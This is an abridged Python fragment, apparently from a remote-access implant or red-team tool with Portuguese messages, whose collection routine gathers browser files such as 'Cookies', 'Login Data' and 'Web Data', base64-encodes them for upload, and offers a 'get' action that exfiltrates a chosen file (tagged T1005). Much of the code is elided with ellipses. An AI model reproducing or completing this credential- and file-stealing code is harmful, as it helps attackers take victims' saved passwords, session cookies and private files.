    def collection_ext(self, task_id, action="screenshot", path="",
            ...
            if b == "firefox":
                ...
                for fn in ("History", "Bookmarks", "Cookies", "Login Data", "Web Data"):
                    ...
                    if os.path.isfile(fp):
                        data = b64file(fp)
                        if data:
                            files.append({"name": "%s_%s" % (b, fn.replace(" ", "_")),
                                          "b64": data})
            else:
                return resp(err="browser invalido (chrome/edge/firefox)")
            if not files:
                return resp(out="[*] Nenhum artefato de %s coletado" % b)
            return resp(
        ...
        # ── GET (T1005) — exfiltra 1 arquivo exato ────────────────────────────
        if action == "get":
            ...
            return resp(out="[+] %s exfiltrado (%d bytes)" %
                        (path, (len(data) * 3) // 4),
